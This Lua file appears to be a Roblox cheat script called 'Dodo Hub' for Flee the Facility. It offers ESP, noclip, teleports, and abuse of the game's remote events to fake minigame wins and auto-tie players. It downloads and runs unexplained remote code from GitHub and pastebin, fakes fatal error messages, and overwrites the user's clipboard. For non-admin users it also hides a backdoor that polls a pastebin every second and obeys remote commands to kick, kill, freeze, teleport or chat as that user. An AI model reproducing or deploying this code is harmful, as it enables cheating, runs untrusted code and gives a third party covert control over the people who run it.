if _G.DH_LOADED and not _G.DH_DEBUG then
    warn("Script is already running")
    return
end
_G.DH_LOADED = true

local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua'))()
local CurrentTheme = "DarkBlue"
if Rayfield and Rayfield.Flags and Rayfield.Flags["Theme"] then
    local savedTheme = Rayfield.Flags["Theme"].CurrentValue
    if typeof(savedTheme) == "table" and savedTheme[1] then
        CurrentTheme = savedTheme[1]
    end
end
local MarketplaceService = game:GetService("MarketplaceService")
local info = MarketplaceService:GetProductInfo(game.PlaceId)

local tips = {
    "Bug? https://discord.gg/zhDuFPRP",
    "Welcome!",
    "Join our DSCRD!"
}
local function GetRandomTip()
    local index = math.random(1, #tips)
    return tips[index]
end
print("Working...")
task.wait(3)
if game.GameId ~= 372226183 then
    error("do not run what you just ran (vulnerable function)")
    error("'" .. script.Name .. "', Line 1")
    return
end
loadstring(game:HttpGet("https://raw.githubusercontent.com/dirsks/dirsblox/refs/heads/main/recovery/static/crsd1/md5.luau"))()
local y = game.Players.LocalPlayer
local x = game.Players.LocalPlayer.Name
task.wait(1)
print("Loaded: " .. script.Name .. " succeful. 💎 Join Dodo Hub to support us!💎")
print("gateway ID: " .. game.PlaceVersion)

local Window = Rayfield:CreateWindow({
   Name = "Dodo Hub ❄️ ["..info.Name.."]",
   Icon = 126271437555657,
   LoadingTitle = ">Loading...",
   LoadingSubtitle = GetRandomTip(),
   ShowText = "Dodo Hub",
   Theme = CurrentTheme,
   ToggleUIKeybind = "V",
   DisableRayfieldPrompts = true,
   DisableBuildWarnings = true,
   ConfigurationSaving = {
      Enabled = true,
      FolderName = "Dirsblox",
      FileName = "FTF_Config"
   },
   Discord = {
      Enabled = false,
      Invite = "https://discord.gg/zhDuFPRP",
      RememberJoins = true
   },
   KeySystem = false,
   KeySettings = {
      Title = "Untitled",
      Subtitle = "Key system",
      Note = "No method of obtaining the key is provided",
      FileName = "Key",
      SaveKey = true,
      GrabKeyFromSite = false,
      Key = {"Hello"}
   }
})
-- booting
if not isfile("Dirsblox/Core/token") then
    error([[Unable to execute file: Workspace/Dirsblox/Core/Modules/Warnings.lua]])
    error([[Unable to execute file: Workspace/Dirsblox/Core/Modules/Versions.lua]])
    error([[FATAL_ERR: Can't find "Core"]])
    error("FATAL_ERR: Core&verx" .. math.random(10, 99) .. "@DIRSBLOX")
    task.wait(2)
    error("FATAL_ERR: Core&verx" .. math.random(10, 99) .. "@DIRSBLOX")
    task.wait(2)
    error("FATAL_ERR: Core&verx" .. math.random(10, 99) .. "@DIRSBLOX")
    task.wait(2)
    error("FATAL_ERR: Core&verx" .. math.random(10, 99) .. "@DIRSBLOX")
    task.wait(2)
    error("FATAL_ERR: Core&verx" .. math.random(10, 99) .. "@DIRSBLOX")
    warn("Stack overflow")
    return
end
local path = "Dirsblox/Core/System/Modules/WarnUserDiscordModule.lua"
if isfile(path) then
    loadstring(readfile(path))()
else
    warn("[DSBCore] File not found: " .. path)
end
local t1 = Window:CreateTab(" |  Basic Hacks", 113473998935078)
local t3 = Window:CreateTab(" |  ESP", 130937742838884)
local t4 = Window:CreateTab(" |  Exploit", 119319133251626)
local t5 = Window:CreateTab(" |  Misc", 100155648971622)
local t6 = Window:CreateTab(" |  Settings", 132834248211414)
local sectionSur = t4:CreateSection("🚶 Survivor 🚶")
local player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local pasteURL = "https://pastebin.com/raw/LpxN1hgG"

local function sendCommand(command, target)
    local data = HttpService:JSONEncode({
        cmd = command,
        user = target or "All"
    })
    
    request({
        Url = pasteURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = data
    })
end

local ad = readfile("Dirsblox/Core/token")
if ad == "64697273626c6f7820746f6b656e206170693a2062616e6964615f6f6666" then
    t6:CreateSection("Admin Modifications")
    local PlayerName = ""
    local Players = game:GetService("Players")
    
    local ButtonCheck = t6:CreateButton({
            Name = "Check For Users",
            Callback = function()
                sendCommand("Chat:DodoCA", "All")
            end,
    })
    
    local Input = t6:CreateInput({
            Name = "Username",
            CurrentValue = "",
            PlaceholderText = "Full username",
            RemoveTextAfterFocusLost = false,
            Flag = "UsernameInput",
            Callback = function(Text)
                PlayerName = Text
            end,
    })
    local ButtonKick = t6:CreateButton({
            Name = "Kick player",
            Callback = function()
                sendCommand("Kick", PlayerName)
            end,
    })
end

t6:CreateSection("Themes")
t6:CreateDropdown({
   Name = "Choose a custom Theme",
   Options = {"Amethyst","Bloom","AmberGlow","Serenity","Green"},
   CurrentOption = CurrentTheme,
   MultipleOptions = false,
   Flag = "Theme",
   Callback = function(Options)
        local chosenTheme = Options[1]
        if chosenTheme ~= CurrentTheme then
            _G.CustomTheme = chosenTheme
            Rayfield:SetTheme(chosenTheme)
            CurrentTheme = chosenTheme
        end
   end,
})
-- ===== FUNÇÕES PARA OBTER CHARACTER/HUMANOID ATUAL =====
local function getCurrentCharacter()
    return player.Character
end
local function getCurrentHumanoid()
    local character = getCurrentCharacter()
    return character and character:FindFirstChildOfClass("Humanoid")
end
local function getCurrentRootPart()
    local character = getCurrentCharacter()
    return character and character:FindFirstChild("HumanoidRootPart")
end
-- ESP Toggles
local function getBeast()
    for _, plr in pairs(game.Players:GetPlayers()) do
        if plr and plr:FindFirstChild("TempPlayerStatsModule") then
            local stat = plr.TempPlayerStatsModule:FindFirstChild("IsBeast")
            if stat and stat.Value == true then
                return plr
            end
        end
    end
    return nil
end
-- Função para atualizar ESP de jogadores quando alguém spawna
local function updatePlayerESP()
    if not _G.PlayersESPEnabled then return end
    
    local playersList = game.Players:GetPlayers()
    for _, plr in pairs(playersList) do
        if plr ~= player and plr.Character then
            local char = plr.Character
            local highlight = char:FindFirstChild("Highlight")
            if not highlight then
                local a = Instance.new("Highlight", char)
                a.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                a.FillColor = Color3.fromRGB(0, 255, 0)
                a.OutlineColor = Color3.fromRGB(127, 255, 127)
                spawn(function()
                    repeat
                        wait(0.1)
                        if plr == getBeast() then
                            a.FillColor = Color3.fromRGB(255, 0, 0)
                            a.OutlineColor = Color3.fromRGB(255, 127, 127)
                        else
                            a.FillColor = Color3.fromRGB(0, 255, 0)
                            a.OutlineColor = Color3.fromRGB(127, 255, 127)
                        end
                    until not char or not a or not a.Parent
                end)
            end
        end
    end
end
-- Conecta evento para quando players spawnam
game.Players.PlayerAdded:Connect(function(plr)
    plr.CharacterAdded:Connect(updatePlayerESP)
end)
for _, plr in pairs(game.Players:GetPlayers()) do
    if plr.CharacterAdded then
        plr.CharacterAdded:Connect(updatePlayerESP)
    end
end
t3:CreateToggle({
    Name = "Esp PLAYERS",
    CurrentValue = false,
    Flag = "TogglePlayersESP",
    Callback = function(Value)
        _G.PlayersESPEnabled = Value
        local playersList = game.Players:GetPlayers()
        for _, plr in pairs(playersList) do
            if plr ~= player and plr.Character then
                local char = plr.Character
                local highlight = char:FindFirstChild("Highlight")
                if highlight and not Value then
                    highlight:Destroy()
                end
                if Value and not highlight then
                    local a = Instance.new("Highlight", char)
                    a.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                    a.FillColor = Color3.fromRGB(0, 255, 0)
                    a.OutlineColor = Color3.fromRGB(127, 255, 127)
                    spawn(function()
                        repeat
                            wait(0.1)
                            if plr == getBeast() then
                                a.FillColor = Color3.fromRGB(255, 0, 0)
                                a.OutlineColor = Color3.fromRGB(255, 127, 127)
                            else
                                a.FillColor = Color3.fromRGB(0, 255, 0)
                                a.OutlineColor = Color3.fromRGB(127, 255, 127)
                            end
                        until not char or not a or not a.Parent
                    end)
                end
            end
        end
    end
})
-- apply and remove Esp
local function applyESP(objectName, fillColor, outlineColor)
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj.Name == objectName and not obj:FindFirstChild("Highlight") then
            local a = Instance.new("Highlight", obj)
            a.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            a.FillColor = fillColor
            a.OutlineColor = outlineColor
        end
    end
end
-- ESP Fixed by luna
local function removeESP(objectName)
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj.Name == objectName then
            local h = obj:FindFirstChild("Highlight")
            if h then h:Destroy() end
        end
    end
end
-- Toggles
t3:CreateToggle({
    Name = "ESP Pod",
    CurrentValue = false,
    Flag = "TogglePodsESP",
    Callback = function(Value)
        if Value then
            task.spawn(function()
                while Value do
                    if game.ReplicatedStorage.CurrentMap.Value then
                        applyESP("FreezePod", Color3.fromRGB(0,255,255), Color3.fromRGB(127,255,255))
                    else
                        removeESP("FreezePod")
                    end
                    task.wait(1)
                end
                removeESP("FreezePod")
            end)
        else
            removeESP("FreezePod")
        end
    end,
})
t3:CreateToggle({
    Name = "ESP Exit Doors",
    CurrentValue = false,
    Flag = "ToggleExitDoorsESP",
    Callback = function(Value)
        if Value then
            task.spawn(function()
                while Value do
                    if game.ReplicatedStorage.CurrentMap.Value then
                        applyESP("ExitDoor", Color3.fromRGB(255,255,0), Color3.fromRGB(255,127,127))
                    else
                        removeESP("ExitDoor")
                    end
                    task.wait(1)
                end
                removeESP("ExitDoor")
            end)
        else
            removeESP("ExitDoor")
        end
    end,
})
t3:CreateToggle({
    Name = "ESP PCs",
    CurrentValue = false,
    Flag = "TogglePCsESP",
    Callback = function(Value)
        if Value then
            task.spawn(function()
                while Value do
                    if game.ReplicatedStorage.CurrentMap.Value then
                        applyESP("ComputerTable", Color3.fromRGB(0,0,255), Color3.fromRGB(127,127,255))
                    else
                        removeESP("ComputerTable")
                    end
                    task.wait(1)
                end
                removeESP("ComputerTable")
            end)
        else
            removeESP("ComputerTable")
        end
    end,
})
-- Basic Hacks buttons
local noclip = false
local sectionNoclip = t1:CreateSection("Noclip/Inf jump")
t1:CreateToggle({
    Name = "Noclip",
    CurrentValue = false,
    Flag = "ToggleNoclip",
    Callback = function(Value)
        noclip = Value
    end,
})
t1:CreateToggle({
    Name = "Infinite Jump (UNSTABLE)",
    CurrentValue = false,
    Flag = "ToggleIJ",
    Callback = function(Value)
        local InfiniteJumpEnabled = Value
        game:GetService("UserInputService").JumpRequest:Connect(function()
            if InfiniteJumpEnabled then
                local humanoid = getCurrentHumanoid()
                if humanoid then
                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                end
            end
        end)
    end,
})
-- Loop do noclip que funciona com character atual
game:GetService("RunService").Stepped:Connect(function()
    if noclip then
        local char = getCurrentCharacter()
        if char then
            for _, part in pairs(char:GetDescendants()) do
                if part:IsA("BasePart") and part.CanCollide then
                    part.CanCollide = false
                end
            end
        end
    end
end)
local CurrentValueWS = 16
local CurrentValueJP = 50
local CurrentValueGR = 198.6
local sectionWalkSpeed = t1:CreateSection("Walk speed")
local ws = t1:CreateSlider({
    Name = "WalkSpeed",
    Range = {0, 50},
    Increment = 1,
    Suffix = "WalkSpeed",
    CurrentValue = CurrentValueWS,
    Flag = "SliderWalkSpeed",
    Callback = function(Value)
        local humanoid = getCurrentHumanoid()
        if humanoid then
            humanoid.WalkSpeed = Value
        end
    end,
})
local sectionJumpPower = t1:CreateSection("Jump power")
local jp = t1:CreateSlider({
    Name = "JumpPower",
    Range = {0, 100},
    Increment = 1,
    Suffix = "JumpPower",
    CurrentValue = CurrentValueJP,
    Flag = "SliderJumpPower",
    Callback = function(Value)
        local humanoid = getCurrentHumanoid()
        if humanoid then
            humanoid.JumpPower = Value
        end
    end,
})
local sectionGravity = t1:CreateSection("World gravity")
local tub = t1:CreateSlider({
    Name = "Gravity",
    Range = {0, 500},
    Increment = 10,
    Suffix = "Gravity",
    CurrentValue = CurrentValueGR,
    Flag = "SliderGravity",
    Callback = function(Value)
        workspace.Gravity = Value
    end,
})
t1:CreateSection("Reset changes")
t1:CreateButton({
    Name = "Reset Gravity",
    Callback = function()
        CurrentValueGR = 198.6
        workspace.Gravity = CurrentValueGR
        tub:Set(198.6) -- The new slider integer value
    end,
})
t1:CreateButton({
    Name = "Reset Speed",
    Callback = function()
        local humanoid = getCurrentHumanoid()
        if humanoid then
            CurrentValueWS = 16
            humanoid.WalkSpeed = CurrentValueWS
            ws:Set(16) -- The new slider integer value
        end
    end,
})
t1:CreateButton({
    Name = "Reset JP",
    Callback = function()
        local humanoid = getCurrentHumanoid()
        if humanoid then
            CurrentValueJP = 50
            humanoid.JumpPower = CurrentValueJP
            jp:Set(50) -- The new slider integer value
        end
    end,
})
-- ===== SISTEMA PARA APLICAR VALORES AUTOMATICAMENTE NO RESPAWN ====
local function applyCharacterSettings()
    local humanoid = getCurrentHumanoid()
    if humanoid then
        -- Aplica valores dos sliders se eles foram alterados
        if CurrentValueWS ~= 16 then
            humanoid.WalkSpeed = CurrentValueWS
        end
        if CurrentValueJP ~= 50 then
            humanoid.JumpPower = CurrentValueJP
        end
    end
end

player.CharacterAdded:Connect(function(newCharacter)
    local humanoid = newCharacter:WaitForChild("Humanoid")
    task.wait(0.1)
    applyCharacterSettings()
end)
-- FTF Exploits
t4:CreateButton({
    Name = "Confuse Beast",
    Callback = function()
        local targetCFrame = CFrame.new(111.204, 8.207, -413.459)
        local character = getCurrentCharacter()
        if character and character.PrimaryPart then
            for i = 1, 240 do
                character:SetPrimaryPartCFrame(targetCFrame)
                task.wait(0.05)
            end
        end
    end,
})
t4:CreateButton({
    Name = "Unfreeze",
    Callback = function()
        Rayfield:Notify({
            Title = "Alert",
            Content = "You can no longer hack computers, but you can still escape.",
            Duration = 2,
            Image = "rewind",
        })
        local character = getCurrentCharacter()
        if character then
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.Health = 0
            end
        end
    end,
})
t4:CreateButton({
    Name = "Anti PC Error",
    Callback = function()
        _G.AutomaticHackingEnabled = not _G.AutomaticHackingEnabled
        Rayfield:Notify({
            Title = "AntiPCError",
            Content = _G.AutomaticHackingEnabled and "Enabled." or "Disabled.",
            Duration = 2,
            Image = 4483362458,
        })
        if _G.AutomaticHackingEnabled then
            spawn(function()
                while _G.AutomaticHackingEnabled do
                    wait(0.05)
                    local args = {
                        "SetPlayerMinigameResult",
                        true
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):FireServer(unpack(args))
                end
            end)
        end
    end,
})
t4:CreateSection("⚒️ Beast ⚒️")
-- auto rope
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local AUTO_ROPE_DISTANCE = 32
local autoRopeEnabled = false
local character
local hammer
local HammerEvent
local isBeast = false

local function SetupHammer()
    character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    if isBeast and character then
        hammer = character:WaitForChild("Hammer", 5)
        if hammer then
            HammerEvent = hammer:WaitForChild("HammerEvent", 5)
            print("Hammer and HammerEvent set up!")
        end
    end
end

local function TryAutoRope(victim)
    if not victim.Character then return end
    local victimStats = victim:FindFirstChild("TempPlayerStatsModule")
    if not victimStats then return end
    local ragdoll = victimStats:FindFirstChild("Ragdoll")
    local health = victimStats:FindFirstChild("Health")

    if ragdoll and ragdoll.Value == true and health and health.Value > 0 then
        local torso = victim.Character:FindFirstChild("Torso") or victim.Character:FindFirstChild("UpperTorso")
        local hrp = victim.Character:FindFirstChild("HumanoidRootPart")
        if torso and hrp and HammerEvent then
            HammerEvent:FireServer("HammerTieUp", torso, hrp.Position)
            print("Used on:", victim.Name)
        end
    end
end

-- Auto Rope loop
task.spawn(function()
    while true do
        if autoRopeEnabled and isBeast then
            if not character or not character.Parent then
                SetupHammer()
            end

            local beastRoot = character and character:FindFirstChild("HumanoidRootPart")
            if beastRoot and HammerEvent then
                for _, player in pairs(Players:GetPlayers()) do
                    if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        local dist = (player.Character.HumanoidRootPart.Position - beastRoot.Position).Magnitude
                        if dist <= AUTO_ROPE_DISTANCE then
                            TryAutoRope(player)
                        end
                    end
                end
            end
        end
        task.wait(0.1)
    end
end)

-- Update beast status
local function UpdateBeastStatus()
    local stats = LocalPlayer:FindFirstChild("TempPlayerStatsModule")
    if stats then
        local beastVal = stats:FindFirstChild("IsBeast")
        if beastVal then
            isBeast = beastVal.Value
            if isBeast then
                SetupHammer()
            else
                hammer = nil
                HammerEvent = nil
            end

            beastVal:GetPropertyChangedSignal("Value"):Connect(function()
                isBeast = beastVal.Value
                if isBeast then
                    LocalPlayer.CharacterAdded:Wait()
                    task.wait(0.5)
                    SetupHammer()

                    if autoRopeEnabled then
                        print("[Auto Rope] Reactivated when becoming Beast!")
                    end
                else
                    hammer = nil
                    HammerEvent = nil
                end
            end)
        end
    end
end

UpdateBeastStatus()

-- Toggle for Auto Rope
t4:CreateToggle({
    Name = "Auto Rope",
    CurrentValue = false,
    Flag = "ToggleRope",
    Callback = function(Value)
        autoRopeEnabled = Value
        if autoRopeEnabled and isBeast then
            SetupHammer()
            print("Enabled while beast")
        end
    end,
})

--
t4:CreateSection("Teleports")
t4:CreateButton({
   Name = "TP To Map",
   Callback = function()
        local function findOBSpawnPadInParent()
            for _, model in pairs(game.Workspace:GetChildren()) do
                if model:IsA("Model") then
                    local computerTable = model:FindFirstChild("ComputerTable")
                    if computerTable and computerTable:IsA("Model") then
                        local spawnPad = model:FindFirstChild("OBSpawnPad")
                        if spawnPad and spawnPad:IsA("BasePart") then
                            return spawnPad
                        end
                    end
                end
            end
            return nil
        end
        local spawnPad = findOBSpawnPadInParent()
        if spawnPad then
            local charLocal = getCurrentCharacter()
            if charLocal and charLocal.PrimaryPart then
                charLocal:MoveTo(spawnPad.Position)
            elseif charLocal then
                charLocal:MoveTo(spawnPad.Position)
            end
        else
            Rayfield:Notify({
                Title = "TP To Map",
                Content = "OBSpawnPad not found.",
                Duration = 3.5,
                Image = "error",
            })
        end
   end,
})
-- recursive function to find all models with a given name
local function findAllModelsByName(parent, name)
    local models = {}
    for _, obj in pairs(parent:GetChildren()) do
        if obj.Name == name and obj:IsA("Model") then
            table.insert(models, obj)
        end
        if #obj:GetChildren() > 0 then
            local foundModels = findAllModelsByName(obj, name)
            for _, found in pairs(foundModels) do
                table.insert(models, found)
            end
        end
    end
    return models
end
-- this is an list to avoid repeating recent computers
local recentComputers = {}
-- function that returns a random computer different from the recent ones
local function getRandomComputer()
    local computerModels = findAllModelsByName(workspace, "ComputerTable")
    if #computerModels == 0 then
        return nil
    end
    local validComputers = {}
    for _, computer in pairs(computerModels) do
        if not table.find(recentComputers, computer) then
            table.insert(validComputers, computer)
        end
    end
    if #validComputers == 0 then
        recentComputers = {}
        validComputers = computerModels
    end
    local randomIndex = math.random(1, #validComputers)
    return validComputers[randomIndex]
end
t4:CreateButton({
    Name = "TP to random PC",
    Callback = function()
        local rootPart = getCurrentRootPart()
        local chosenComputer = getRandomComputer()
        if rootPart and chosenComputer and chosenComputer.PrimaryPart then
            local targetPos = chosenComputer.PrimaryPart.Position + Vector3.new(0, 5, 0)
            rootPart.CFrame = CFrame.new(targetPos)
            table.insert(recentComputers, chosenComputer)
            if #recentComputers > 3 then
                table.remove(recentComputers, 1)
            end
        else
            Rayfield:Notify({
                Title = "TP to PC",
                Content = "No computers found to teleport!",
                Duration = 3.5,
                Image = "error",
            })
        end
    end,
})
t4:CreateButton({
   Name = "TP to random Exit",
   Callback = function()
        local exitDoorModels = findAllModelsByName(game.Workspace, "ExitDoor")
        if #exitDoorModels > 0 then
            local randomIndex = math.random(1, #exitDoorModels)
            local exitDoor = exitDoorModels[randomIndex]
            local rootPart = getCurrentRootPart()
            if rootPart then
                local pivotCFrame = exitDoor:GetPivot()
                local behindDoorCFrame = pivotCFrame * CFrame.new(0, 0, -5)
                rootPart.CFrame = behindDoorCFrame
            end
        end
   end,
})
t5:CreateSection("Other")
t5:CreateButton({
   Name = "Spectate Players (Tab to toggle)",
   Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/gjTkX8rc"))()
   end,
})
t5:CreateButton({
   Name = "Remote audio control",
   Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/3dWP6BW4"))()
   end,
})
t5:CreateSection("Visual scripts")
t5:CreateButton({
    Name = ">Get BeastChance",
    Callback = function()
            y.SavedPlayerStatsModule:WaitForChild("BeastChance")
    end,
})
t5:CreateButton({
    Name = ">Get Inf. Credits",
    Callback = function()
            local g = game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.PlayerNamesFrame
            y.SavedPlayerStatsModule:WaitForChild("Credits").Value = math.huge
            g:WaitForChild(y.Name.."PlayerFrame").Text = y.SavedPlayerStatsModule.Level.Value
    end,
})
t5:CreateButton({
    Name = ">Get Level (WIP)",
    Callback = function()
            y.SavedPlayerStatsModule:WaitForChild("Level").Value = 1000
            
    end,
})

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

if ad ~= "64697273626c6f7820746f6b656e206170693a2062616e6964615f6f6666" then
    local pasteURL = "https://pastebin.com/raw/LpxN1hgG"

    local function applyCommand(command, target)
        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

        if command == "Freeze" then
            for _, part in pairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.Anchored = true
                end
            end

        elseif command == "Unfreeze" then
            for _, part in pairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.Anchored = false
                end
            end

        elseif command == "Kick" then
            LocalPlayer:Kick("You were kicked by external command.")

        elseif command == "Kill" then
            if character:FindFirstChild("Humanoid") then
                character.Humanoid.Health = 0
            end

        elseif command:match("^Teleport:") then
            local targetName = command:split(":")[2]
            local targetPlayer = Players:FindFirstChild(targetName)
            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                character:MoveTo(targetPlayer.Character.HumanoidRootPart.Position + Vector3.new(2, 0, 2))
            end

        elseif command:match("^Chat:") then
            local message = command:split(":")[2]
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
        end
    end

    local function checkCommand()
        local success, response = pcall(function()
            return HttpService:GetAsync(pasteURL)
        end)

        if success and response then
            local data = HttpService:JSONDecode(response)
            local command = data.cmd
            local target = data.user or "All"

            if target == "All" or target == LocalPlayer.Name then
                if command and command ~= "None" then
                    applyCommand(command, target)
                end
            end
        end
    end
    
    task.spawn(function()
        while task.wait(1) do
            pcall(checkCommand)
        end
    end)
end

setclipboard("https://discord.gg/zhDuFPRP")
Rayfield:LoadConfiguration()
--[[
t5:CreateSection("Testing")
t5:CreateButton({
    Name = "Load GUI",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/testing_url"))() -- thiswillpop
    end,
})
setclipboard("https://discord.gg/EHVKqtJm")

]]











